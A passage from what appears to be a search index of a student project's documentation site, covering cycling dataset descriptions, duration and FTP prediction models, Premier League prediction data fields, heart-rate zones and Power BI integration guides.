maintain a user-centric approach throughout the process. ","version":"Next","tagName":"h2"},{"title":"Cycling Data Description","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/cycling-data-description","content":"","keywords":"","version":"Next"},{"title":"Data Fields​","type":1,"pageTitle":"Cycling Data Description","url":"/redback-documentation/docs/project-3/research/cycling-data-description#data-fields","content":" The CSV file contains data related to cycling activities, structured as columns that capture different aspects of each cycling session. The fields contained within the dataset are:  Date_AEST: The date of the cycling activity, formatted as &quot;DD-MMM-YY&quot;. Time_first: A column with obscured or encrypted data. Time_last: Another column with obscured or encrypted data. Distance: Distance covered during the activity, presumably in kilometers. calories: The number of calories burned. Speed_max: The maximum speed achieved, likely in km/h. Speed_min: The minimum speed, likely in km/h. Note: All values in the dataset are set to 0. Speed_avg: The average speed, likely in km/h. Heartrate_max: The maximum heart rate recorded. Note: This is recorded to two decimal places for some entries which is very unusual for heart rate values but all such values and in .99 so it may be a transcoding issue rather than genuine extra precision. Heartrate_min: The minimum heart rate recorded. Note: Similar to Heartrate_max, some entries are recorded to two decimal places with all such entries ending in .18. Heartrate_avg: Average heart rate. Cadence_max: Maximum cadence, likely in revolutions per minute. Cadence_min: Minimum cadence. Note: All values in the dataset are set to 0. Cadence_avg: Average cadence. Power_max: Maximum power output, likely in watts. Power_min: Minimum power output. Note: All values in the dataset are set to 0. Power_avg: Average power output. FTP: Functional Threshold Power, a key cycling metric. Time_Taken: Time taken for some aspect of the activity, format unclear. dist_point in 20: A metric calculated to provide a score out of 20 from distance fields. calories_point in 20: A metric calculated to provide a score out of 20 from calorie fields. hertrate_point in20: A metric calculated to provide a score out of 20 from heart rate fields. Speed_point iin 20: A metric calculated to provide a score out of 20 from speed fields. power_points in 20: A metric calculated to provide a score out of 20 from power fields. candence_point in 20: A metric calculated to provide a score out of 20 from cadence fields. total_points: Total points from summing the six calculated points fields. Duration: Duration of the activity in hours:minutes:seconds format. Workout_duration: Duration of the workout, likely in hours.  ","version":"Next","tagName":"h2"},{"title":"Data features and characteristics​","type":1,"pageTitle":"Cycling Data Description","url":"/redback-documentation/docs/project-3/research/cycling-data-description#data-features-and-characteristics","content":" There are numerous unusual features of the dataset. The notable aspects are:  The Duration field contains nonsensical data. It appears to be in the format of hh:mm:ss but the values do not align with the distance and average speed fields for each record. Furthermore, all entries have 13:41 for the mm:ss portion of the field which is not realistically possible across 209 different cycling sessions. The hh portion increments by one for each record while resetting to 0 whenever the field exceeds 23. It is not known at this stage whether the problem is form the original data or was caused by an extraction error. The Workout_duration is the hours portion of the Duration field which means that it is also nonsensical. The Time_taken field does not align to the correct session duration either so it is not known what this field represents. The various points fields are calculated from other fields but do not seem to add any value for building ML models. As yet, the actual calculation for creating each points field (other than the total) is not clear and has not been pursued because it is irrelevant.  ","version":"Next","tagName":"h2"},{"title":"Data manipulations​","type":1,"pageTitle":"Cycling Data Description","url":"/redback-documentation/docs/project-3/research/cycling-data-description#data-manipulations","content":" Since the Duration and Workout_duration fields were unreliable, a new field was created called Real_duration that was calculated from Distance / Speed_avg. This allowed a reliable duration field to be created.  ","version":"Next","tagName":"h2"},{"title":"Exploratory models​","type":1,"pageTitle":"Cycling Data Description","url":"/redback-documentation/docs/project-3/research/cycling-data-description#exploratory-models","content":" The python code and notebook related to this exploration is available at https://github.com/brendankntb/SPA_2023_T3/blob/main/Predictive Model Analysis.ipynb.  Exploratory models and visualisations were then created to test the ability to predict the Real_duration field from the other fields. Since this was envisaged as being used to predict how long a single ride might take, the Speed_avg field was removed because it would only be known after a ride was completed. For this initial exploration, the maximum speed was not removed because it was expected that the models would not find value in using that metric for predicting duration which was confirmed with the models created.  It is important to note that these models are not being optimised nor even expected to be the best possible models for predicting duration. They were simple and fast models being used to test whether the dataset contained information that looked reliable for predicting ride duration.  To that end, initially a simple random forest model was created for this testing.  ","version":"Next","tagName":"h2"},{"title":"Field correlations with Realduration​","type":1,"pageTitle":"Cycling Data Description","url":"/redback-documentation/docs/project-3/research/cycling-data-description#field-correlations-with-realduration","content":" Field\tCorrelation with Real_durationReal_duration\t1.000 Distance\t0.980 Calories\t0.940 Dist_point in 20\t0.653 Calories_point in 20\t0.544 Total_points\t0.543 Cadence_max\t0.511 Speed_max\t0.443 Speed_point in 20\t0.327 Power_max\t0.292 Cadence_avg\t0.242 Speed_avg\t0.222 Time_Taken\t0.192 Power_points in 20\t0.152 Candence_point in 20\t0.152 Cadence_min\t0.109 Power_avg\t0.043 Heartrate_max\t-0.098 Workout_duration\t-0.117 Speed_min\t-0.119 Heartrate_min\t-0.181 Heartrate_avg\t-0.206 Hertrate_point in 20\t-0.224 Power_min\t- FTP\t-  The initial view of correlations shows:  High Positive Correlation: Distance (0.980): Strongly positive, indicating longer distances generally result in longer durations. Calories (0.940): Also highly correlated, suggesting that more calories are burned in longer-duration activities. Moderate Positive Correlation: Dist_point in 20 (0.653) and Calories_point in 20 (0.544): These also correlate with Real_duration but it is significant that they correlate less strongly than the original fields that the were created from. This suggests that the points fields are not adding value to the predictive model. Total_points (0.543): This also has a correlation lower than key fields above. Cadence_max (0.511) and Speed_max (0.443): Higher maximum cadence and speed values are moderately associated with longer durations. Low Positive Correlation: Speed_avg (0.222): A low positive correlation suggests that higher average speeds don't necessarily correlate strongly with longer durations. This islikely due to varying intensity levels of the rides and the fact that longer rides may actually have lower average speed in some cases because of fatigue. Cadence_avg (0.242), Power_max (0.292), and related metrics show low positive correlations, indicating a slight tendency for these metrics to be higher in longer rides. Once again, fatigue may impact on the correlation here and it is possible that there is a non-linear relationship that may increase up to a certain duration and then decrease after another duration. Negative Correlation: Heartrate_max (-0.098), Heartrate_min (-0.181), and Heartrate_avg (-0.206): These negative correlations suggest that longer durations might require lower effort levels to be able to complete the entire workout.  ","version":"Next","tagName":"h3"},{"title":"Model performance​","type":1,"pageTitle":"Cycling Data Description","url":"/redback-documentation/docs/project-3/research/cycling-data-description#model-performance","content":"   A random forest model was created to predict Real_duration after dropping the fields:  Real_duration date_AEST Time_first Time_last Duration Time_Taken Workout_duration dist_point in 20 calories_point in 20 Speed_point iin 20 power_points in 20 candence_point in 20 total_points  The model achieved a mean squared error (MSE) of approximately 0.0069. ","version":"Next","tagName":"h2"},{"title":"Cycling duration prediction models","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/cycling-duration-prediction-models","content":"Last updated by: brendankntb, Last updated on: '31/03/2024' Last updated by: brendankntb, Last updated on: '31/03/2024' Cycling duration prediction models A number of experiments were performed to test prediction models for duration of a workout based upon previous workout details. These experiments can been seen in the Python Notebook in the Project GitHub repository. Data Loading and Preprocessing: The notebook starts with loading cycling data that has been exported from Strava and that contains numerous attributes like distance, speed, heart rate, power, etc. The data contains information for 181 Ride activities and 164 Run activities. Feature Selection and Model Training: A correlation analysis is done which shows that the highest correlations to Movint Time (duration) are: Power Count 0.998145 Distance 0.982650 Total Work 0.940714 Calories 0.787830 Maximum Power 2.0 hr 0.717964 Relative Effort 0.575082 Maximum Power 1.5 hr 0.568730 Dirt Distance 0.560717 Elevation Gain 0.504852 Many of these features are essentially proxies for distance as Work, Elevation Gain, Calories and others are going to increase as the duration of the workout increases. Fields that are too closely related to Moving Time (duration) are removed before creating predictive models. These fields are Elapsed Time, Power Count, Moving Time and Average Elapsed Speed. Model Evaluation: Several different models are the created to test accuracy. These are: Random Forest Regressor Support Vector Regressor Linear Regressor Neural Network Mean squared error is the primary metric used to quantify the model's performance. Each model is used to plot actual versus predicted durations to visualise model performance. The available data was split 80/20 for training/testing. GridSearchCV is used to optimise hyper parameters for Random Forrest Regressor and Support Vector Regressor. Multiple NN architectures and numbers of epochs were tested. Visualisation and Performance: The visualisations of each model are: A scatter plot was also produced of the Actual versus Predicted durations with the values connected to show how close each prediction was. These Mean Squared Error for each model is. Model\tRMSE\tTimeRandom Forest Regressor\t566.94\t8.1s Support Vector Regressor\t409.94\t0.2s Linear Regressor\t321.32\t0.1s Neural Network\t361.08\t11.8s Across the 37 test cases, the average difference between the predicted duration and the real duration was 14.3s for rides averaging 1:53:58. Conclusions: The Neural Network model performed quite well when tuned but the Linear Regressor still produced a smaller RMSE. The Linear Regressor was also the fastest model. It was concluded that a simple Linear Regression model could accurately predict workout duration and required the least resources to do so.","keywords":"","version":"Next"},{"title":"Cycling FTP prediction models","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/cycling-ftp-prediction-models","content":"Last updated by: brendankntb, Last updated on: '31/03/2024' Last updated by: brendankntb, Last updated on: '31/03/2024' Cycling FTP prediction models A number of experiments were performed to test prediction models for duration of a workout based upon previous workout details. These experiments can been seen in the Python Notebook in the Project GitHub repository. FTP is a critical performance metric in cycling, indicating the highest power a rider can sustain for an hour. Data Preparation The notebook starts with loading cycling data that has been exported from Strava and that contains numerous attributes like distance, speed, heart rate, power, etc. The data contains information for 181 Ride activities and 164 Run activities. A power curve is created and visualised to give a view of the data being used. Feature Engineering and Selection Some exploration of outliers is done but they do not have a significant impact on averages remaining so there is no further attempt to remove outliers. Fields are removed from the dataset that are not connected to FTP. These fields are Activity ID, Activity Name, Activity Type, Commute, Activity Gear, Filename, Dirt Distance and Total Steps. Known FTP values from external FTP testing is then merged with the data. There are 5 dates with FTP tests which were all don with the 20 minute test method. Model Building and Evaluation An initial Linear Regression machine learning model is constructed to predict FTP based on the selected features. This model is trained on historical data, learning the relationship between the features and FTP. The Linear Regression model has a MSE of 39.1. A Gradient Boost model is the created as well. The Gradient Boost model has an MSE of 15.6. A HistGradientBoostingRegressor was tried as it is able to handle NaN inputs but it did not produce any substantially better results. The results were clumped because the relatively small number of FTP tests meant that there were only ever four correct values across the test set. To counter this, The FTP results were interpolated between tests to create a more continuous distribution. This resulted in significantly better performance. MSE was reduce to 1.7. A change in how the input data was then tried. Instead of including the Maximum Power for each ride in the input data, it was replaced with a 60 day Maximum Power which obviously included the Maximum Power for the leading two months. The created a sliding window effect to the input data. The accuracy of the model significantly improved again. The MSE was further reduced to 0.03. Conclusions and Insights The Random Forest Regressor was chosen as the appropriate model along with the interpolated FTP and the 60 day maximum power values in the training data. This model produced an average error of 0.12W against an average 237W FTP. The notebook might also suggest improvements or further areas for research, such as incorporating additional features or testing different machine learning algorithms. The model was then incorporated into a FtpPredictor Python class. Various samples of the class were created. The FtpPredictor class was documented to support automated solution documentation. Unit tests were added for the class.","keywords":"","version":"Next"},{"title":"Developing ML Models for Football Prediction","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#introduction","content":" Welcome to the Football Game Outcome Prediction Analysis Confluence page! This project aims to predict the outcomes of football games, specifically focusing on the Premier League games that occurred during the 2022-23 season. The predictive models are built using a dataset publicly available on Football-Data.co.uk.  ","version":"Next","tagName":"h2"},{"title":"Overview​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#overview","content":" ","version":"Next","tagName":"h2"},{"title":"Objective​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#objective","content":" The primary objective of this project is to develop machine learning models capable of predicting the results of Premier League football matches. By leveraging historical data from the 2022-23 season, we seek to uncover patterns and factors that contribute to the success or failure of teams in a given match.  ","version":"Next","tagName":"h3"},{"title":"Dataset Details​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#dataset-details","content":" ","version":"Next","tagName":"h2"},{"title":"Data Source​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#data-source","content":" The dataset utilized for this analysis is sourced from Football-Data.co.uk. This platform provides comprehensive football statistics, including match outcomes, team performance metrics, and other relevant information. The dataset specifically focuses on Premier League matches during the 2022-23 season, ensuring relevance and timeliness.  ","version":"Next","tagName":"h3"},{"title":"Data Format and Source​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#data-format-and-source","content":" The dataset is provided in CSV format, making it compatible with standard spreadsheet applications. It is sourced from Football-Data.co.uk. Note that some abbreviations, particularly those related to odds from specific bookmakers, may refer to data collected in earlier seasons.  ","version":"Next","tagName":"h3"},{"title":"Key Fields in the Dataset​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#key-fields-in-the-dataset","content":" Div: League Division Date: Match Date (dd/mm/yy) Time: Time of match kick-off HomeTeam: Home Team AwayTeam: Away Team FTHG and HG: Full Time Home Team Goals FTAG and AG: Full Time Away Team Goals FTR and Res: Full Time Result (H=Home Win, D=Draw, A=Away Win) HTHG: Half Time Home Team Goals HTAG: Half Time Away Team Goals HTR: Half Time Result (H=Home Win, D=Draw, A=Away Win)  ","version":"Next","tagName":"h3"},{"title":"Match Statistics​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#match-statistics","content":" Where available, the dataset includes match statistics such as:  Attendance: Crowd Attendance Referee: Match Referee HS and AS: Home and Away Team Shots HST and AST: Home and Away Team Shots on Target HC and AC: Home and Away Team Corners HF and AF: Home and Away Team Fouls Committed HFKC and AFKC: Home and Away Team Free Kicks Conceded HO and AO: Home and Away Team Offsides HY and AY: Home and Away Team Yellow Cards HR and AR: Home and Away Team Red Cards HBP and ABP: Home and Away Team Bookings Points  ","version":"Next","tagName":"h3"},{"title":"Betting Odds​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#betting-odds","content":" The dataset includes betting odds from various bookmakers, with key abbreviations such as:  B365H, B365D, B365A: Bet365 home, draw, and away win odds BSH, BSD, BSA: Blue Square home, draw, and away win odds BWH, BWD, BWA: Bet&amp;Win home, draw, and away win odds  ","version":"Next","tagName":"h3"},{"title":"Asian Handicap Betting Odds​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#asian-handicap-betting-odds","content":" For Asian handicap betting, key fields include:  BbAH, BbAHh: Number of BetBrain bookmakers used and size of handicap (home team) BbMxAHH, BbAvAHH: Betbrain maximum and average Asian handicap home team odds BbMxAHA, BbAvAHA: Betbrain maximum and average Asian handicap away team odds  ","version":"Next","tagName":"h3"},{"title":"Closing Odds​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#closing-odds","content":" Closing odds, denoted with a &quot;C&quot; character, represent the last odds before the match starts.  ","version":"Next","tagName":"h3"},{"title":"Methodology​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#methodology","content":" ","version":"Next","tagName":"h2"},{"title":"Feature Selection​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#feature-selection","content":" The analysis involves utilizing key features from the dataset, including team performance metrics, match details, game context, and betting odds.The models are trained and evaluated using the aforementioned dataset. Various features from the dataset, such as team statistics, match location, and historical performance, are considered in the modeling process.  ","version":"Next","tagName":"h3"},{"title":"Data Preprocessing​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#data-preprocessing","content":" Before training machine learning models, the dataset undergoes preprocessing, including handling missing data, encoding categorical variables, and scaling numerical features.  ","version":"Next","tagName":"h3"},{"title":"Scope​","type":1,"pageTitle":"Developing ML Models for Football Prediction","url":"/redback-documentation/docs/project-3/research/developing-ml-models-for-football-prediction#scope","content":" This project serves as a demonstration of applying machine learning techniques to football analytics. The findings can offer insights into the factors influencing match outcomes.  E0.csv   ","version":"Next","tagName":"h3"},{"title":"Functional Threshold Power","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/functional-threshold-power","content":"","keywords":"","version":"Next"},{"title":"Why is FTP Important?​","type":1,"pageTitle":"Functional Threshold Power","url":"/redback-documentation/docs/project-3/research/functional-threshold-power#why-is-ftp-important","content":" FTP serves as a foundational metric for several key aspects of your cycling training:  Training Zones: FTP helps establish training zones based on individual fitness level. These zones guide workouts, ensuring that training is at the right intensity to stimulate improvements in aerobic capacity and endurance. Progress Tracking: Tracking changes in FTP over time can help assess the effectiveness of a training program. An increase in FTP indicates improved fitness and performance. Race Pacing: Knowing FTP allows setting of appropriate pacing strategies for races and long rides. It enables avoiding burning out early by staying within a sustainable power range. Customized Workouts: With FTP in hand, you can tailor workouts to match fitness level, ensuring each session is challenging but achievable.  ","version":"Next","tagName":"h2"},{"title":"How to Determine Your FTP​","type":1,"pageTitle":"Functional Threshold Power","url":"/redback-documentation/docs/project-3/research/functional-threshold-power#how-to-determine-your-ftp","content":" There are several methods to determine FTP:  Functional Threshold Power Test: The most accurate way to determine your FTP is by performing a dedicated FTP test. This typically involves a 20-minute all-out effort, followed by a calculation to estimate FTP based on the power output during that effort. Commonly used platforms for these include such as Zwift and TrainerRoad but they can easily be performed without a platform on any bike that has a power metre. This would also be an excellent candidate for adding to the Redback Operations virtual riding platform. Power Metre: If you have a power metre on your bike, it can continuously measure power output, making it easier to track FTP without a formal test. Various training platforms and apps can estimate your FTP based on power data and this project has implemented a predictive model to accurately estimate FTP based of sub-maximal training workouts. FTP Ramp Test: Some cycling software platforms offer ramp tests that gradually increase the resistance or power output until the cyclist can no longer maintain the prescribed pace. These tests can provide an estimate of FTP.  ","version":"Next","tagName":"h2"},{"title":"Resources for Further Exploration​","type":1,"pageTitle":"Functional Threshold Power","url":"/redback-documentation/docs/project-3/research/functional-threshold-power#resources-for-further-exploration","content":" To learn more about FTP and its application in cycling, the following resources contain further information:  Functional Threshold Power: The Most Important Power Metric TrainingPeaks offers a comprehensive explanation of FTP and its role in effective training. FTP or Critical Power – which is the best cycling fitness test? Cycling Weekly's guide provides insights into FTP testing and its significance in cycling while comparing it to the similar Critical Power (CP) test. Functional Threshold Power: What FTP Means to Cyclists TrainerRoad explains the definition and significance of FTP for cyclists.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Functional Threshold Power","url":"/redback-documentation/docs/project-3/research/functional-threshold-power#conclusion","content":" FTP, or Functional Threshold Power, is a vital metric for cyclists looking to improve their performance. By understanding FTP, you can tailor training, monitor progress, and enhance overall cycling experience. For both experienced and novice cyclists, incorporating FTP into training can lead to substantial improvements in cycling abilities. ","version":"Next","tagName":"h2"},{"title":"Heart Rate Zones","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/heart-rate-zones","content":"","keywords":"","version":"Next"},{"title":"Heart Rate Zones​","type":1,"pageTitle":"Heart Rate Zones","url":"/redback-documentation/docs/project-3/research/heart-rate-zones#heart-rate-zones-1","content":" Heart rate zones are ranges of the heart which, usually expressed as a percentage of your maximum heart rate, that correspond to different levels of exercise intensity. These ranges are used to guide training and exercise intensity for various fitness goals. Heart rate ranges are generally classified into the following zones.  Zone 1 - Light Intensity (50-60% of Max Heart Rate)  This zone is ideal for warming up or cooling down and is a great zone to stay in for recovery workouts. Exercising in this zone helps improve overall health and can help beginners start their fitness journey.  Zone 2 - Moderate Intensity (60-70% if Max Heart Rate)  This zone is generally used for endurance training and helps improve aerobic capacity and endurance. In this zone, it is expected you can perform exercises for longer periods, which is great for runners and cyclists.  Zone 3 - Aerobic/Tempo Intensity (70-80% of Max Heart Rate)  Training in this zone can help improve the efficiency the blood circulation and strengthening the cardiovascular system.  Zone 4 - Anaerobic Threshold (80-90% of Max Heart Rate)  Training in this zone can help improve your lactate threshold, which increases your ability to perform at higher intensities for longer. It is highly effectives for improving speed and muscle strength.  Zone 5 - Maximum Effort (90-100% of Max Heart Rate)  This is the highest intensity zone and involves short bursts of maximum effort exercises. This zone is typically activated during interval training and is used for improving maximum speed and power.  ","version":"Next","tagName":"h2"},{"title":"Maximum Heart Rate​","type":1,"pageTitle":"Heart Rate Zones","url":"/redback-documentation/docs/project-3/research/heart-rate-zones#maximum-heart-rate","content":" A general rule to calculate your maximum heart rate (MHR) is by subtracting your age from 220. For example, for a 30-year-old, their MHR would be:  220 - 30 = 190 beats per minute  ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Heart Rate Zones","url":"/redback-documentation/docs/project-3/research/heart-rate-zones#references","content":" Cleveland Clinic (2023). ‘Exercise Heart Rate Zones Explained’. Available at Exercise Heart Rate Zones Explained – Cleveland Clinic (Accessed 22 November 2023). Lal M (2022). Healthgrades. ‘Heart Rate Zones’. Available at: Target Heart Rate Zones Explained (healthgrades.com) (Accessed 22 November 2023). Polar (2023). ‘Running Heart Rate Zones: The Basics’. Available at: Heart Rate Zones | The Basics | Polar Journal(Access 22 November 2023). John Hopkins Medicine (2023). ‘Understanding Your Target Heart Rate’. Available at: Understanding Your Target Heart Rate | Johns Hopkins Medicine (Accessed 22 November 2023). ","version":"Next","tagName":"h3"},{"title":"Power BI & Python Integration","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/power-bi-python-integration","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Power BI & Python Integration","url":"/redback-documentation/docs/project-3/research/power-bi-python-integration#introduction","content":" This guide is designed to walk you through the process of integrating Python into Power BI, a synergy that unlocks a new realm of possibilities for data analysis and business intelligence.  ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Power BI & Python Integration","url":"/redback-documentation/docs/project-3/research/power-bi-python-integration#prerequisites","content":" Install Python: Ensure python is installed on your computer. Install Power BI Desktop: If you haven’t already, install Power BI desktop from the Microsoft Store.  ","version":"Next","tagName":"h2"},{"title":"Step-by-Step Guide​","type":1,"pageTitle":"Power BI & Python Integration","url":"/redback-documentation/docs/project-3/research/power-bi-python-integration#step-by-step-guide","content":" ","version":"Next","tagName":"h2"},{"title":"Setting Up Python in Power BI​","type":1,"pageTitle":"Power BI & Python Integration","url":"/redback-documentation/docs/project-3/research/power-bi-python-integration#setting-up-python-in-power-bi","content":" Open Power BI Desktop. Go to Options: In the top menu, click on File then Options and settings and select Options    Python Scripting Settings: In the Options window, navigate to the Python scripting section. Here, you can specify the Python home directory and the IDE to be used.    ","version":"Next","tagName":"h3"},{"title":"Using Python in Power BI​","type":1,"pageTitle":"Power BI & Python Integration","url":"/redback-documentation/docs/project-3/research/power-bi-python-integration#using-python-in-power-bi","content":" Get and Model Data with Python​  Click Home, then Get Data and select Python script.    Enter your python script to retrieve and model data. For example, you could use pandas to read CSV file and import relevant machine learning libraries to create a predictive model.    Once the script is executed, you can select the Data Frame you want load to the Power BI model. Once selected, click Load to finalise or Transform Data if you want to transform the data further using Power Query.    Python Visuals​  In the report view, select Python visual icon in the Visualisations pane.    Add the data fields you want to include in your Python script.    A Python script editor will open at the bottom where you can write your script to create a visual. Libraries like matplotlib and seaborn can be used here.    Once you added your python script, click the play button in the top right-hand corner and your visual will render.  ","version":"Next","tagName":"h2"},{"title":"Useful Resources​","type":1,"pageTitle":"Power BI & Python Integration","url":"/redback-documentation/docs/project-3/research/power-bi-python-integration#useful-resources","content":" Power BI Documentation: Power BI documentation - Power BI | Microsoft Learn Python Documentation: Python 3.12.1 Documentation ","version":"Next","tagName":"h2"},{"title":"Power BI & GitHub Integration","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/power-bi-github-integration","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Power BI & GitHub Integration","url":"/redback-documentation/docs/project-3/research/power-bi-github-integration#introduction","content":" Power BI and GitHub are powerful tools in data analysis and software development, respectively. Integrating Power BI with GitHub allows users to visualise and analyse data hosted on GitHub repositories. The primary advantage of this integration is the seamless update process. Any modifications made to the data in GitHub are easily synchronised with the Power BI dashboard, eliminating the need to establish a new connection for each update.  This guide provides a step-by-step guide approach to establish a direct connection between Power BI and GitHub, enabling efficient data analysis and reporting.  ","version":"Next","tagName":"h2"},{"title":"Step-by-Step Guide​","type":1,"pageTitle":"Power BI & GitHub Integration","url":"/redback-documentation/docs/project-3/research/power-bi-github-integration#step-by-step-guide","content":" ","version":"Next","tagName":"h2"},{"title":"Finding Data in GitHub​","type":1,"pageTitle":"Power BI & GitHub Integration","url":"/redback-documentation/docs/project-3/research/power-bi-github-integration#finding-data-in-github","content":" Identify the repository containing the data you wish analyse, and navigate to the data file you wish to use.    Click Raw.    Copy the URL.    ","version":"Next","tagName":"h3"},{"title":"Connecting GitHub Data to Power BI​","type":1,"pageTitle":"Power BI & GitHub Integration","url":"/redback-documentation/docs/project-3/research/power-bi-github-integration#connecting-github-data-to-power-bi","content":" Open Power BI and select Get Data. Choose Web as the data source.    Paste the copied URL from GitHub and click OK.    Check the data load appears correct and adjust parameters as required. Use the Power Query Editor in Power BI to transform or modify the data as needed.    Load the data to create reports and visualisations.    ","version":"Next","tagName":"h3"},{"title":"Useful Resources​","type":1,"pageTitle":"Power BI & GitHub Integration","url":"/redback-documentation/docs/project-3/research/power-bi-github-integration#useful-resources","content":" Power BI Documentation: Power BI documentation - Power BI | Microsoft Learn GitHub Help Documentation: GitHub Docs ","version":"Next","tagName":"h2"},{"title":"Sports Performance Overview","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/sports-performance-overview","content":"","keywords":"","version":"Next"},{"title":"Overall Objective​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#overall-objective","content":" The Sports Performance Analysis project aims to deliver comprehensive analysis in various sports, leveraging both real-time and historical data. This project encompasses two main areas: predictive analytics and data visualisation.   In predictive analytics, the project aims to employ data analysis and machine learning techniques to forecast outcomes in diverse sports disciplines. This approach is designed to offer deep insights, aiding in the enhancement of both individual athletes and team performances. By analysing patterns and trends, the project aims to provide strategic guidance to optimise training and competitive strategies.   For data visualisations, the project aims to create dynamic and interactive experiences through Power BI. These dashboards will be tailored to present insights in various sports domains, ranging from individual pursuits like cycling to team sports like football and cricket. The projects aim is not to just track performance and progress but also to provide a clear, understandable visual and representation of complex data.  ","version":"Next","tagName":"h2"},{"title":"Cycling Analysis​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#cycling-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"Cycling Performance Analysis​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#cycling-performance-analysis","content":" Objective​  The objective of the analysis is to provide a comprehensive overview of key performance metrics such as distance covered, power output, cadence, calories expenditure, and heart rate. The output aims to help cyclists, coaches, and fitness enthusiasts to track progress, identify areas for improvement, and optimise training strategies.  Data Sources​  The data used for this analysis was internally generated by Redback Operation’s SunCycle Smart Bike Project. Please refer to the projects repo for the data used in analysis.  cyclist_data_23T2.csv  ","version":"Next","tagName":"h3"},{"title":"20km Time Trial Analysis​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#20km-time-trial-analysis","content":" The objective of the analysis is to understand the relationships between cadence, heart rate and power output under different conditions, and to determine the consistency of cyclist responses during a 20km distance. The analysis seeks to identify patterns and correlations that could help in optimising training strategies and improve cycling performance. Externally sourced data was used to create a benchmark for athlete comparison across similar distances.  Data Sources​  The data used for this analysis was internally generated by Redback Operation’s SunCycle Smart Bike Project. Please refer to the projects GitHub repository for the data used in analysis:  cyclist_data_23T2.csv  Additionally, externally sourced data was for benchmarking which has been loaded into the project’s GitHub repository.  20km_time_trial_cycling.csv  The data was originally sourced from Mendeley Data.  Borg, David; Osborne, John (2019), “20 km time trial cycling performance with and without task-specific feedback”, Mendeley Data, V3, doi: 10.17632/zxrdvwp6yr.3  ","version":"Next","tagName":"h3"},{"title":"Football Analysis​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#football-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"English Premier League (EPL) Team Fixture Prediction​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#english-premier-league-epl-team-fixture-prediction","content":" Objective​  The objective of the model is to forecast the outcomes of EPL games based on historical data. The goal is to analyse the data to identify patterns and factors that most significantly influence game outcomes, enabling accurate predictions for future matches.  The model aims to provide invaluable information for team strategy development and fan engagement.  Data Sources​  Please refer to the Project's repo for the data used in the analysis:  consol_epl_results_raw.csv  The data was originally sourced from http://Football-data.co.uk :  Football-data.co.uk (n.d.). England Football Results Betting Odds | Premiership Results &amp; Betting Odds. Available at England Football Results Betting Odds | Premiership Results &amp; Betting Odds (football-data.co.uk). Accessed on 20 November 2023.  ","version":"Next","tagName":"h3"},{"title":"Cricket Analysis​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#cricket-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"Bowling Statistic Analysis​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#bowling-statistic-analysis","content":" Objective​  The primary goal of this analysis is to provide a comprehensive understanding of cricket bowling statistics, focusing on identifying top wicket-takers, bowlers with the best averages, and the most economical bowlers.  ","version":"Next","tagName":"h3"},{"title":"T20 World Cup Decision Impact Analysis​","type":1,"pageTitle":"Sports Performance Overview","url":"/redback-documentation/docs/project-3/research/sports-performance-overview#t20-world-cup-decision-impact-analysis","content":" Objective​  The analysis explores and quantifies the impact of decisions made after 